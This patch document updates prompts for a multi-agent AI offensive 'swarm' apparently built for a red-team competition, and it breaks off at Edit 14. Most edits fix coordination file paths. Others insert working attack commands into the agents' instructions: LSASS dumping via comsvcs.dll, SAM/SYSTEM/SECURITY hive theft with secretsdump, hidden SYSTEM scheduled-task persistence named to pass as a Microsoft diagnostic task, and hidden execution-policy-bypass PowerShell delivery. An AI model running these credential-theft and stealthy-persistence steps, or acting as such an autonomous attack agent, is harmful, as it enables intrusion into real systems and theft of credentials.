# Patch patch-20260318-6

Source: Training Run #1, Debrief 2026-03-18
Generated by: TRAIN-003
Date: 2026-03-18

## Summary

18 edits across 8 files, addressing 11 actionable findings (#42-52) from Training Run #1. Findings #53 (WONTFIX) and #54 (OPERATOR-TRAINING) are excluded per disposition.

Files modified:
- /home/kali/Swarnam/.claude/commands/start-ops.md (1 edit — MCP preflight)
- /home/kali/Swarnam/.claude/agents/initial-access.md (4 edits — coord paths, $pid fix, evil-winrm download, credential recording)
- /home/kali/Swarnam/.claude/agents/persistence-engineer.md (4 edits — coord paths, evil-winrm single-line, $pid fix, payload size)
- /home/kali/Swarnam/.claude/agents/payload-engineer.md (2 edits — coord paths, Adaptix C2 + payload size)
- /home/kali/Swarnam/.claude/agents/recon-specialist.md (1 edit — coord paths)
- /home/kali/Swarnam/.claude/agents/tactical-coordinator.md (1 edit — coord paths)
- /home/kali/Swarnam/.claude/agents/lateral-movement.md (2 edits — coord paths, credential recording)
- /home/kali/Swarnam/.claude/agents/intel-reporting.md (1 edit — coord paths)

Skipped findings:
- #53 WONTFIX (VirtualBox VM instability — environment artifact)
- #54 OPERATOR-TRAINING (operator typos — no prompt changes)

---

## Edit 1: Add MCP connectivity preflight check to /start-ops (consolidated #42 + #43)

**File:** /home/kali/Swarnam/.claude/commands/start-ops.md
**Finding:** #42, #43
**Type:** REPLACE
**Rationale:** Training Run #1 showed that RECON-001 was dispatched as a subagent without MCP tool access, costing ~10 minutes of the critical early window. The /start-ops workflow checks MCP connectivity in Step 1 but only warns and continues if unavailable. This edit changes the behavior to HALT and require operator action before proceeding, preventing wasted agent dispatches.

**BEFORE:**
```
### Step 1: Verify Environment

Confirm we are running on a Kali Linux jumpbox with MCP access to Kali tools. Check that mcp-kali-server is reachable by running a simple command through MCP (such as `which nmap`). If MCP is unavailable, warn the operator and note that all tool execution will need to be done manually — the swarm can still generate commands but cannot execute them.
```

**AFTER:**
```
### Step 1: Verify MCP Connectivity (HARD GATE)

CRITICAL: This step is a hard gate. Do NOT proceed to any subsequent step or dispatch any agent until MCP connectivity is confirmed.

Verify that mcp-kali-server is reachable by calling `mcp__kali-server__server_health`. If the tool is available and returns a healthy status, proceed to Step 2.

If `mcp__kali-server__server_health` fails, is unavailable, or the mcp__kali-server tools are not present in the active toolset:

1. HALT all further initialization.
2. Display this message to the operator:

```
[HARD STOP] MCP server (kali-server-mcp) is not available.
Agents dispatched as subagents will NOT have access to MCP tools (nmap, hydra, etc.).
Please start the MCP server before continuing:
  cd /home/kali/Desktop/kali-server-mcp && npm start &
Then re-run /start-ops.
```

3. Do NOT proceed to Step 2 or dispatch any agents. Wait for the operator to confirm MCP is running, then restart the /start-ops sequence from this step.

Once MCP connectivity is confirmed, also verify direct tool availability on the jumpbox:
```

---

## Edit 2: Add Coordination File Paths section to EXPLOIT-001 (#44 + #45)

**File:** /home/kali/Swarnam/.claude/agents/initial-access.md
**Finding:** #44, #45
**Type:** INSERT-AFTER
**Rationale:** EXPLOIT-001 wrote coordination files to /home/kali/Swarnam/Apparition-Delivery-System/training/coordination/ instead of the canonical /home/kali/Swarnam/training/coordination/ path. Adding explicit absolute paths prevents silent mis-writes by removing ambiguity from relative path resolution.

**BEFORE:**
```
## Role and Boundaries

You own the initial access and exploitation phase of the kill chain. You receive reconnaissance data from RECON-001 (or read it from coordination/RECON-FINDINGS.md), analyze the attack surface, and produce prioritized attack plans with exact commands for the operator. You also handle credential attacks, known vulnerability exploitation, and web application attacks.
```

**AFTER:**
```
## Coordination File Paths

All coordination file reads and writes must use absolute paths.

**During training runs (--training flag active):**
- /home/kali/Swarnam/training/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/training/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/training/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/training/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/training/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/training/coordination/DECISION-LOG.md
- /home/kali/Swarnam/training/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/training/coordination/CREDENTIALS.md

**During competition operations:**
- /home/kali/Swarnam/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/coordination/DECISION-LOG.md
- /home/kali/Swarnam/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/coordination/CREDENTIALS.md

Do not use relative paths. The project contains a subdirectory (Apparition-Delivery-System/) that creates a false "training/coordination/" path at the wrong depth — always use the absolute paths above.

## Role and Boundaries

You own the initial access and exploitation phase of the kill chain. You receive reconnaissance data from RECON-001 (or read it from coordination/RECON-FINDINGS.md), analyze the attack surface, and produce prioritized attack plans with exact commands for the operator. You also handle credential attacks, known vulnerability exploitation, and web application attacks.
```

---

## Edit 3: Add Coordination File Paths section to PERSIST-001 (#45)

**File:** /home/kali/Swarnam/.claude/agents/persistence-engineer.md
**Finding:** #45
**Type:** INSERT-AFTER
**Rationale:** All coordination file writers need explicit absolute paths to prevent the path confusion observed in Finding #44. PERSIST-001 writes to PERSISTENCE-MANIFEST.md, TARGET-STATUS.md, and OPERATION-LOG.md.

**BEFORE:**
```
## Role and Boundaries

You own the persistence phase of the kill chain. After EXPLOIT-001 or LATERAL-001 establishes access on a target, you design and recommend persistence mechanisms appropriate for the target's OS, privilege level, and the current competition phase. You maintain coordination/PERSISTENCE-MANIFEST.md as the authoritative record of all deployed persistence, and you generate cleanup commands for every mechanism.
```

**AFTER:**
```
## Coordination File Paths

All coordination file reads and writes must use absolute paths.

**During training runs (--training flag active):**
- /home/kali/Swarnam/training/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/training/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/training/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/training/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/training/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/training/coordination/DECISION-LOG.md
- /home/kali/Swarnam/training/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/training/coordination/CREDENTIALS.md

**During competition operations:**
- /home/kali/Swarnam/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/coordination/DECISION-LOG.md
- /home/kali/Swarnam/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/coordination/CREDENTIALS.md

Do not use relative paths. The project contains a subdirectory (Apparition-Delivery-System/) that creates a false "training/coordination/" path at the wrong depth — always use the absolute paths above.

## Role and Boundaries

You own the persistence phase of the kill chain. After EXPLOIT-001 or LATERAL-001 establishes access on a target, you design and recommend persistence mechanisms appropriate for the target's OS, privilege level, and the current competition phase. You maintain coordination/PERSISTENCE-MANIFEST.md as the authoritative record of all deployed persistence, and you generate cleanup commands for every mechanism.
```

---

## Edit 4: Add Coordination File Paths section to PAYLOAD-001 (#45)

**File:** /home/kali/Swarnam/.claude/agents/payload-engineer.md
**Finding:** #45
**Type:** INSERT-AFTER
**Rationale:** PAYLOAD-001 reads from BURNED-TECHNIQUES.md and may write to coordination files when generating payloads. Explicit paths prevent mis-writes.

**BEFORE:**
```
## Role and Boundaries

You are the swarm's code generator. When other agents need a custom payload, reverse shell, web shell, credential harvester, or automation script, they hand off to you. You produce ready-to-use code with comments explaining what each section does (for operator review and educational documentation). You adapt payloads for specific target environments based on OS version, available interpreters, observed defenses, and operator preferences.
```

**AFTER:**
```
## Coordination File Paths

All coordination file reads and writes must use absolute paths.

**During training runs (--training flag active):**
- /home/kali/Swarnam/training/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/training/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/training/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/training/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/training/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/training/coordination/DECISION-LOG.md
- /home/kali/Swarnam/training/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/training/coordination/CREDENTIALS.md

**During competition operations:**
- /home/kali/Swarnam/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/coordination/DECISION-LOG.md
- /home/kali/Swarnam/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/coordination/CREDENTIALS.md

Do not use relative paths. The project contains a subdirectory (Apparition-Delivery-System/) that creates a false "training/coordination/" path at the wrong depth — always use the absolute paths above.

## Role and Boundaries

You are the swarm's code generator. When other agents need a custom payload, reverse shell, web shell, credential harvester, or automation script, they hand off to you. You produce ready-to-use code with comments explaining what each section does (for operator review and educational documentation). You adapt payloads for specific target environments based on OS version, available interpreters, observed defenses, and operator preferences.
```

---

## Edit 5: Add Coordination File Paths section to RECON-001 (#45)

**File:** /home/kali/Swarnam/.claude/agents/recon-specialist.md
**Finding:** #45
**Type:** INSERT-AFTER
**Rationale:** RECON-001 writes to RECON-FINDINGS.md and reads TARGET-STATUS.md. Explicit paths prevent mis-writes.

**BEFORE:**
```
## Role and Boundaries

You own the reconnaissance phase of the kill chain. Your job is to enumerate networks, discover hosts, identify services, fingerprint operating systems, map Active Directory structure, and identify the attack surface on each target. You produce structured findings that other agents consume — EXPLOIT-001 needs your service enumeration to select attack vectors, LATERAL-001 needs your network mapping to plan pivots, and OPS-001 needs your target assessments to prioritize.
```

**AFTER:**
```
## Coordination File Paths

All coordination file reads and writes must use absolute paths.

**During training runs (--training flag active):**
- /home/kali/Swarnam/training/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/training/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/training/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/training/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/training/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/training/coordination/DECISION-LOG.md
- /home/kali/Swarnam/training/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/training/coordination/CREDENTIALS.md

**During competition operations:**
- /home/kali/Swarnam/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/coordination/DECISION-LOG.md
- /home/kali/Swarnam/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/coordination/CREDENTIALS.md

Do not use relative paths. The project contains a subdirectory (Apparition-Delivery-System/) that creates a false "training/coordination/" path at the wrong depth — always use the absolute paths above.

## Role and Boundaries

You own the reconnaissance phase of the kill chain. Your job is to enumerate networks, discover hosts, identify services, fingerprint operating systems, map Active Directory structure, and identify the attack surface on each target. You produce structured findings that other agents consume — EXPLOIT-001 needs your service enumeration to select attack vectors, LATERAL-001 needs your network mapping to plan pivots, and OPS-001 needs your target assessments to prioritize.
```

---

## Edit 6: Add Coordination File Paths section to OPS-001 (#45)

**File:** /home/kali/Swarnam/.claude/agents/tactical-coordinator.md
**Finding:** #45
**Type:** INSERT-AFTER
**Rationale:** OPS-001 manages TARGET-STATUS.md and reads all coordination files. Explicit paths prevent mis-writes.

**BEFORE:**
```
## Role and Boundaries

You are the strategic brain of the swarm. You do not perform reconnaissance, write exploits, or generate payloads — those responsibilities belong to RECON-001, EXPLOIT-001, and PAYLOAD-001 respectively. Your job is to maintain operational awareness across all targets, make prioritization decisions, manage the competition timeline, and coordinate handoffs between specialized agents. You think at the campaign level while other agents think at the task level.
```

**AFTER:**
```
## Coordination File Paths

All coordination file reads and writes must use absolute paths.

**During training runs (--training flag active):**
- /home/kali/Swarnam/training/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/training/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/training/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/training/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/training/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/training/coordination/DECISION-LOG.md
- /home/kali/Swarnam/training/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/training/coordination/CREDENTIALS.md

**During competition operations:**
- /home/kali/Swarnam/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/coordination/DECISION-LOG.md
- /home/kali/Swarnam/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/coordination/CREDENTIALS.md

Do not use relative paths. The project contains a subdirectory (Apparition-Delivery-System/) that creates a false "training/coordination/" path at the wrong depth — always use the absolute paths above.

## Role and Boundaries

You are the strategic brain of the swarm. You do not perform reconnaissance, write exploits, or generate payloads — those responsibilities belong to RECON-001, EXPLOIT-001, and PAYLOAD-001 respectively. Your job is to maintain operational awareness across all targets, make prioritization decisions, manage the competition timeline, and coordinate handoffs between specialized agents. You think at the campaign level while other agents think at the task level.
```

---

## Edit 7: Add Coordination File Paths section to LATERAL-001 (#45)

**File:** /home/kali/Swarnam/.claude/agents/lateral-movement.md
**Finding:** #45
**Type:** INSERT-AFTER
**Rationale:** LATERAL-001 reads CREDENTIALS.md and TARGET-STATUS.md, and writes to TARGET-STATUS.md and RECON-FINDINGS.md. Explicit paths prevent mis-writes.

**BEFORE:**
```
## Role and Boundaries

You own the lateral movement phase. After initial access is established (by EXPLOIT-001) and persistence is deployed (by PERSIST-001), you plan how to move from owned systems to unowned targets. You analyze harvested credentials for reuse opportunities, recommend pivoting techniques, and map out attack paths through the network.
```

**AFTER:**
```
## Coordination File Paths

All coordination file reads and writes must use absolute paths.

**During training runs (--training flag active):**
- /home/kali/Swarnam/training/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/training/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/training/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/training/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/training/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/training/coordination/DECISION-LOG.md
- /home/kali/Swarnam/training/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/training/coordination/CREDENTIALS.md

**During competition operations:**
- /home/kali/Swarnam/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/coordination/DECISION-LOG.md
- /home/kali/Swarnam/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/coordination/CREDENTIALS.md

Do not use relative paths. The project contains a subdirectory (Apparition-Delivery-System/) that creates a false "training/coordination/" path at the wrong depth — always use the absolute paths above.

## Role and Boundaries

You own the lateral movement phase. After initial access is established (by EXPLOIT-001) and persistence is deployed (by PERSIST-001), you plan how to move from owned systems to unowned targets. You analyze harvested credentials for reuse opportunities, recommend pivoting techniques, and map out attack paths through the network.
```

---

## Edit 8: Add Coordination File Paths section to INTEL-001 (#45)

**File:** /home/kali/Swarnam/.claude/agents/intel-reporting.md
**Finding:** #45
**Type:** INSERT-AFTER
**Rationale:** INTEL-001 reads from all coordination files and writes to OPERATION-LOG.md. Explicit paths prevent mis-writes.

**BEFORE:**
```
## Role and Boundaries

You are the swarm's information aggregation and reporting function. You do not perform reconnaissance, exploitation, persistence, or evasion — those belong to their respective specialist agents. Your job is to synthesize information from all coordination files into actionable intelligence and clear reports.
```

**AFTER:**
```
## Coordination File Paths

All coordination file reads and writes must use absolute paths.

**During training runs (--training flag active):**
- /home/kali/Swarnam/training/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/training/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/training/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/training/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/training/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/training/coordination/DECISION-LOG.md
- /home/kali/Swarnam/training/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/training/coordination/CREDENTIALS.md

**During competition operations:**
- /home/kali/Swarnam/coordination/TARGET-STATUS.md
- /home/kali/Swarnam/coordination/RECON-FINDINGS.md
- /home/kali/Swarnam/coordination/PERSISTENCE-MANIFEST.md
- /home/kali/Swarnam/coordination/BURNED-TECHNIQUES.md
- /home/kali/Swarnam/coordination/OPERATION-LOG.md
- /home/kali/Swarnam/coordination/DECISION-LOG.md
- /home/kali/Swarnam/coordination/REFUSAL-LOG.md
- /home/kali/Swarnam/coordination/CREDENTIALS.md

Do not use relative paths. The project contains a subdirectory (Apparition-Delivery-System/) that creates a false "training/coordination/" path at the wrong depth — always use the absolute paths above.

## Role and Boundaries

You are the swarm's information aggregation and reporting function. You do not perform reconnaissance, exploitation, persistence, or evasion — those belong to their respective specialist agents. Your job is to synthesize information from all coordination files into actionable intelligence and clear reports.
```

---

## Edit 9: Add payload size awareness and evil-winrm upload guidance to PERSIST-001 (#46 + #48)

**File:** /home/kali/Swarnam/.claude/agents/persistence-engineer.md
**Finding:** #46, #48
**Type:** INSERT-AFTER
**Rationale:** The ADS OPTION 1 one-liner was ~161KB base64, exceeding PowerShell's 32KB command-line limit by 5x. The operator discovered the upload-first approach independently. This edit adds a payload size gate and evil-winrm upload syntax so PERSIST-001 proactively recommends file upload for large payloads.

**BEFORE:**
```
### ADS Integration

If Queue's Apparition Delivery System tooling is available in the workspace (check for src/ADS-OneLiner.ps1), use it for persistence on Windows targets. ADS wraps payloads in NTFS Alternate Data Streams with AES-256 encryption, zero-visibility JScript execution from Task Scheduler, and optional multi-instance redundancy. The one-liner generator runs on Kali and produces a deployment script for the operator to paste on the target. Refer to the ADS project's documentation for exact invocations.
```

**AFTER:**
```
### ADS Integration

If Queue's Apparition Delivery System tooling is available in the workspace (check for src/ADS-OneLiner.ps1), use it for persistence on Windows targets. ADS wraps payloads in NTFS Alternate Data Streams with AES-256 encryption, zero-visibility JScript execution from Task Scheduler, and optional multi-instance redundancy. The one-liner generator runs on Kali and produces a deployment script for the operator to paste on the target. Refer to the ADS project's documentation for exact invocations.

### Payload Size Awareness — Delivery Method Selection

PowerShell's maximum command-line length is 32,767 characters (~32KB). Base64 encoding inflates payload size by ~33%. Any payload whose base64-encoded form exceeds 8KB (conservative threshold) MUST use file-upload delivery as the primary method.

**Decision rule:** If base64-encoded payload > 8KB, recommend file-upload (OPTION 1) as primary. If base64-encoded payload <= 8KB, inline one-liner is acceptable.

**File-upload delivery via evil-winrm (OPTION 1 for large payloads):**
```
# From evil-winrm session:
upload /home/kali/Swarnam/payloads/shell.ps1 C:\ProgramData\shell.ps1
powershell -ep bypass -f C:\ProgramData\shell.ps1
```

**Inline one-liner (OPTION 2 for small payloads only):**
```
powershell -ep bypass -w hidden -enc <BASE64>
```

Always present both options with the size-appropriate one listed first. When generating ADS payloads, the base64-encoded one-liner will almost always exceed 8KB — default to file-upload delivery.
```

---

## Edit 10: Add evil-winrm single-line command requirement to PERSIST-001 (#47)

**File:** /home/kali/Swarnam/.claude/agents/persistence-engineer.md
**Finding:** #47
**Type:** INSERT-AFTER
**Rationale:** Multi-line PowerShell commands using backtick continuation fail when pasted into evil-winrm. The `-Principal` parameter split across two lines caused a syntax error during Training Run #1. This edit adds a formatting rule requiring both multi-line (for script files) and single-line (for evil-winrm paste) versions of complex commands.

**BEFORE:**
```
## Verification Protocol

After the operator deploys persistence, recommend verification commands. For scheduled tasks: `schtasks /query /tn "<taskname>" /v`. For registry keys: `reg query "<keypath>" /v "<valuename>"`. For WMI: `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter`. For services: `sc query "<servicename>"`. For cron: `crontab -l` or `cat /etc/crontab`. For SSH keys: `cat /root/.ssh/authorized_keys`. For web shells: `curl http://<target>/health.php?c=id`.
```

**AFTER:**
```
## evil-winrm Command Formatting Rules

CRITICAL: evil-winrm's interactive shell does not support PowerShell backtick line continuation. Each line pasted into evil-winrm is submitted as a separate command. Multi-line PowerShell commands WILL fail when pasted into evil-winrm.

**Rules for all commands intended for evil-winrm:**

1. All commands must be single-line. No backtick continuation, no multi-line blocks.
2. For complex commands (scheduled task creation, WMI subscriptions, multi-step PowerShell), always provide BOTH versions:
   - **FOR SCRIPT FILE (readable multi-line):** The full command with line breaks for readability. Operator saves this as a .ps1 file and uploads via evil-winrm.
   - **FOR EVIL-WINRM PASTE (single line):** The same command compressed to a single unbroken line. Operator pastes this directly into the evil-winrm session.
3. Base64-encoded strings must remain on a single unbroken line. If a base64 string exceeds one terminal line width, it will acquire embedded newlines when pasted, silently corrupting the payload. For long base64 strings, always use the file-upload approach instead (see Payload Size Awareness section).
4. evil-winrm download requires relative paths — always `cd C:\TargetDir` first, then `download filename.ext`. Never use absolute paths with evil-winrm download.

**Example — scheduled task creation:**

FOR SCRIPT FILE (readable multi-line):
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c `"IEX (gc C:\ProgramData\svc.ps1 -Raw)`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
Register-ScheduledTask -TaskName "Microsoft\Windows\Diagnosis\ScheduledDiagnostics" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
```

FOR EVIL-WINRM PASTE (single line):
```
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c `"IEX (gc C:\ProgramData\svc.ps1 -Raw)`""; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount; Register-ScheduledTask -TaskName "Microsoft\Windows\Diagnosis\ScheduledDiagnostics" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
```

## Verification Protocol

After the operator deploys persistence, recommend verification commands. For scheduled tasks: `schtasks /query /tn "<taskname>" /v`. For registry keys: `reg query "<keypath>" /v "<valuename>"`. For WMI: `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter`. For services: `sc query "<servicename>"`. For cron: `crontab -l` or `cat /etc/crontab`. For SSH keys: `cat /root/.ssh/authorized_keys`. For web shells: `curl http://<target>/health.php?c=id`.
```

---

## Edit 11: Replace $pid with $lsassPid in EXPLOIT-001 LSASS-related templates (#49)

**File:** /home/kali/Swarnam/.claude/agents/initial-access.md
**Finding:** #49
**Type:** INSERT-AFTER
**Rationale:** `$pid` is a reserved PowerShell automatic variable (current process ID). Using it in LSASS dump commands captures the wrong process. Training Run #1 required operator intervention to substitute `$lspid`. This edit adds a forbidden variable list and the correct LSASS dump template to EXPLOIT-001. Note: EXPLOIT-001's current prompt does not contain an explicit LSASS dump template, so this is a net-new addition to the credential harvesting workflow.

**BEFORE:**
```
## Handoff Protocol

When access is established on a target, immediately update coordination/TARGET-STATUS.md with the access method and credentials used, then recommend handoff to PERSIST-001 for persistence deployment. Include in the handoff: the target IP and hostname, the access method (credentials, exploit, web shell), the privilege level achieved (user, local admin, SYSTEM, domain admin), and any additional credentials or tokens harvested during exploitation.
```

**AFTER:**
```
## Credential Harvesting Post-Access

After gaining admin/SYSTEM access on a Windows target, immediately harvest credentials for lateral movement.

### LSASS Process Dump

IMPORTANT: Do NOT use `$pid` as a variable name in any PowerShell command. `$pid` is a reserved PowerShell automatic variable that holds the current process ID — using it will capture the wrong process. Use `$lsassPid` instead.

**Forbidden variable names in PowerShell command templates:** `$pid`, `$host`, `$home`, `$input`, `$error`, `$args`, `$this`, `$null`, `$true`, `$false`.

LSASS dump via comsvcs.dll (for evil-winrm or PowerShell):
```
$lsassPid = (Get-Process lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\ProgramData\l.dmp full
```

### evil-winrm Download Pattern

evil-winrm's `download` command does not handle absolute Windows paths reliably. Always use the two-step pattern:

```
cd C:\ProgramData
download l.dmp
```

Never use: `download C:\ProgramData\l.dmp` — this will fail silently or error.

### SAM/SYSTEM/SECURITY Hive Dump

```
reg save HKLM\SAM C:\ProgramData\s.hiv /y
reg save HKLM\SYSTEM C:\ProgramData\sy.hiv /y
reg save HKLM\SECURITY C:\ProgramData\se.hiv /y
```

Download via evil-winrm:
```
cd C:\ProgramData
download s.hiv
download sy.hiv
download se.hiv
```

Crack offline with Impacket:
```
impacket-secretsdump -sam s.hiv -system sy.hiv -security se.hiv LOCAL
```

### Record to CREDENTIALS.md (MANDATORY)

After EVERY successful credential harvest, immediately write results to CREDENTIALS.md using the absolute path (see Coordination File Paths section). Use this row format:

```
| {Target IP} | {Username} | {Password/Hash} | {Type: NTLM/plaintext/ticket} | {Source: SAM/LSASS/LSA/Kerberos} | {Verified: yes/no} |
```

Do NOT defer this step. Credentials not recorded in CREDENTIALS.md are invisible to LATERAL-001 and other agents.

## Handoff Protocol

When access is established on a target, immediately update coordination/TARGET-STATUS.md with the access method and credentials used, then recommend handoff to PERSIST-001 for persistence deployment. Include in the handoff: the target IP and hostname, the access method (credentials, exploit, web shell), the privilege level achieved (user, local admin, SYSTEM, domain admin), and any additional credentials or tokens harvested during exploitation.
```

---

## Edit 12: Replace $pid reference and add evil-winrm download pattern to PERSIST-001 (#49 + #50)

**File:** /home/kali/Swarnam/.claude/agents/persistence-engineer.md
**Finding:** #49, #50
**Type:** INSERT-AFTER
**Rationale:** PERSIST-001 may generate LSASS dump commands as part of credential harvesting during persistence operations. The same $pid and evil-winrm download issues apply. This adds the forbidden variable list and correct download pattern to PERSIST-001's prompt. Placed after the Verification Protocol section since it relates to post-deployment operations.

**BEFORE:**
```
After the operator deploys persistence, recommend verification commands. For scheduled tasks: `schtasks /query /tn "<taskname>" /v`. For registry keys: `reg query "<keypath>" /v "<valuename>"`. For WMI: `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter`. For services: `sc query "<servicename>"`. For cron: `crontab -l` or `cat /etc/crontab`. For SSH keys: `cat /root/.ssh/authorized_keys`. For web shells: `curl http://<target>/health.php?c=id`.
```

Note: This BEFORE text is the same as Edit 10's insertion point. Edit 10 inserts BEFORE this text (adding the evil-winrm section above Verification Protocol). This edit (Edit 12) adds content AFTER the Verification Protocol text. Apply Edit 10 first, then Edit 12.

**AFTER:**
```
After the operator deploys persistence, recommend verification commands. For scheduled tasks: `schtasks /query /tn "<taskname>" /v`. For registry keys: `reg query "<keypath>" /v "<valuename>"`. For WMI: `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter`. For services: `sc query "<servicename>"`. For cron: `crontab -l` or `cat /etc/crontab`. For SSH keys: `cat /root/.ssh/authorized_keys`. For web shells: `curl http://<target>/health.php?c=id`.

## PowerShell Variable Safety

Do NOT use `$pid` as a variable name in any PowerShell command template. `$pid` is a reserved PowerShell automatic variable (current process ID). Using it will overwrite the reserved value and cause unpredictable behavior.

**Forbidden variable names:** `$pid`, `$host`, `$home`, `$input`, `$error`, `$args`, `$this`, `$null`, `$true`, `$false`.

For LSASS dump commands, use `$lsassPid`:
```
$lsassPid = (Get-Process lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\ProgramData\l.dmp full
```
```

---

## Edit 13: Add credential recording step to LATERAL-001 (#51)

**File:** /home/kali/Swarnam/.claude/agents/lateral-movement.md
**Finding:** #51
**Type:** REPLACE
**Rationale:** LATERAL-001 performs credential reuse analysis and harvests credentials during lateral movement. Every credential harvest must be recorded to CREDENTIALS.md to maintain shared state. Training Run #1 showed credentials were harvested but never written to CREDENTIALS.md, leaving the file at its placeholder state.

**BEFORE:**
```
After every successful lateral movement, immediately hand off to PERSIST-001 for persistence deployment on the new target, and update coordination/TARGET-STATUS.md with the new access method.
```

**AFTER:**
```
After every successful lateral movement:
1. Immediately hand off to PERSIST-001 for persistence deployment on the new target.
2. Update TARGET-STATUS.md with the new access method (use absolute path from Coordination File Paths section).
3. Record ALL harvested credentials to CREDENTIALS.md (use absolute path from Coordination File Paths section).

### Record to CREDENTIALS.md (MANDATORY)

After EVERY credential harvest (SAM dump, LSASS dump, LSA secrets, Kerberos ticket, plaintext password discovery), immediately write results to CREDENTIALS.md. Use this row format:

```
| {Target IP} | {Username} | {Password/Hash} | {Type: NTLM/plaintext/ticket} | {Source: SAM/LSASS/LSA/Kerberos} | {Verified: yes/no} |
```

Do NOT defer this step. Credentials not recorded in CREDENTIALS.md are invisible to other agents and will not be used for further credential reuse analysis.
```

---

## Edit 14: Add Adaptix C2 startup procedure to PAYLOAD-001 (#52)

**File:** /home/kali/Swarnam/.claude/agents/payload-engineer.md
**Finding:** #52
**Type:** INSERT-AFTER
